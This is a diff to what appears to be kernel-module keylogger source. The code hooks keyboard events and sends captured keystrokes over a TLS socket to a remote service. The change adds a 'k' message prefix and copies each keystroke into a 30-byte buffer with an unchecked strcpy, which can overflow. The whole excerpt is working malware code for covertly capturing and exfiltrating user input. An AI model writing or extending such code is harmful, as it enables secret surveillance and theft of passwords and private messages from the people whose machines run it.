@@ -552,11 +552,17 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
 }
 
 void consume_keys(struct work_struct* work) {
+    unsigned char buffer[30];
     const char* keystroke = key_work.keylog_data;
     if (!keystroke) {
         return;
     }
-    send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
+    //k is for keystrokes
+    buffer[0] = 'k';
+    strcpy((char *) buffer + 1, keystroke);
+
+    //send_msg(svc->tls_socket, (unsigned char*) keystroke, strlen(keystroke));
+    send_msg(svc->tls_socket, buffer, strlen((const char *) buffer));
     printk(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
 
